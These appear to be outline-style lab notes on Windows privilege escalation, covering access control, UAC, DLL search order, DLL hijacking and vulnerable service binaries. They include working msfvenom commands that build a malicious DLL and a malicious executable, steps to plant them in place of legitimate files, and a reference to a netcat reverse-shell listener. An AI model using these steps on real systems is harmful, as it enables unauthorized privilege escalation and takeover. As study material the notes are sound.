Windows Exploitation
 - Modes and Levels
    - Kernel Mode and User Mode
    - Privileged vs Unprivileged
 - Windows access control model
    - Access Tokens
       - Security identifer (SID) associations and token associations
    - Security Descriptors
       - DACL
       - SACL System level
       - ACEs
 - DLL Search Order
    - Executables check the following locations (in successive order) 
       - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
       - The directory the application was run from
       - The directory specified in in the C+ function GetSystemDirectory()
       - The directory specified in the C+ function GetWindowsDirectory()
       - The current directory
- Windows integrity mechanism
   - Untrusted : Anonymous SID access tokens
   - Low : Everyone SID access token (World)
   - Medium : Authenticated Users
   - High : Administrators
   - System : System services (LocalSystem, LocalService, NetworkService)
- User Account Control(UAC)
   - Always Notify
   - Notify me only when programs try to make changes to my computer
   - Notify me only when programs try to make changes to my computer(do not dim my desktop)
   - Never notify
   - Demo:Checking UAC Settings
      - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
- AutoElevate Executables
   - Requested Execution levels
      - asInvoker
      - highestAvailable
- Priv Esc
- Scheduled Tasks & Services
   - Write Permissions
   - Non-Standard Locations
   - Unquoted Executable Paths
   - Vulnerabilities in executables
   - Permissions to run as system
   - Demo: Finding vulnerable scheduled tasks
      - schtasks /query /fo LIST /v | select-string -Pattern "Task"
      - procmon -accepteula
- DLL Hijacking
   - Identify vulnerability
   - Take advantage of the default search order for DLLS
   - NAME_NOT_FOUND present in executables system calls
   - Validate permissions
   - Create and transfor Malicious DLL
   - Demo : Finding vulnerable services
      - wmic service list full
      - sc query
      - services.msc
         - look for null or bootleg descriptions
   - Demo: DLL Hijacking
      - Identify Vulnerability
      - Validate permissions
      - Validate executable paths
      - Replace with malicous file
   - schtasks /query /fo LIST /v
   - schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6
   - C:\Users\student\exercise_2\putty.exe
   - Run: sigcheck c:\users\student\exercise_2\putty.exe
   - Run: icacls "c:\users\student\exercise_2"
   - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f dll > WIMM.dll
   - Transfer the DLL to the target machine using one of the following methods:
      - scp the dll from linux to target machine
   - Put the retrieved DLL in the same location as the vulnerable Putty executable
      - Run: copy "PATH OF MALICIOUS DLL" "c:\users\student\exercise_2\ntmarta.dll"
   - Allow for Putty to execute with scheduled task
- Vulnerable services
   - Find vulnerable services
      - wmic service list full
      - services.msc
      - sc.exe qc <service name>
      - for /f "tokens=2 delims='='" %a in ('wmic service get PathName /FORMAT:LIST^|findstr /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
   - Check permissions
      - icacls "C:\Program Files\7-Zip\"
      - icacls "C:\Program Files\7-Zip\7z.exe"
   - Identify and document the service information associated with the path
      - From CMD: wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" | finstr /i "7z.exe"
         - path: C:\Program Files\7-Zip\
         - service name: testservice2
   - Exploiting the service
      - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f exe > 7z.exe
      - create a backup of the 7z.exe file on the target system
      - replace the original 7z.exe with the malicous 7z.exe
         - if using a reverse shell payload setup a netcat listener
         - start the service
         - verify it's running
         - tasklist /FI "IMAGENAME eq 7z.exe"
         
 - Persistance locations
    - Sch tasks
    - Run keys (HKLM/HKU)
    - psprofiles
 - Logging Audits
    - auditpol /get /category:*
    - auditpol /get /category:* | findstr /i "success failure"
    - Important Microsoft event IDs
       - 4624/4625 Successful/failed login
       - 4720 Account created
       - 4672 Administrative user logged on
       - 7045 Service created
    - wevtutil el
    - wmic ntevent where "logfile="<LOGNAME>" list full
    - Get-Eventlog -list
    - storage location: C:\windows\system32\config\
    - Demo
       - 
       - 
       - 
       - 
       - 
       - 
    
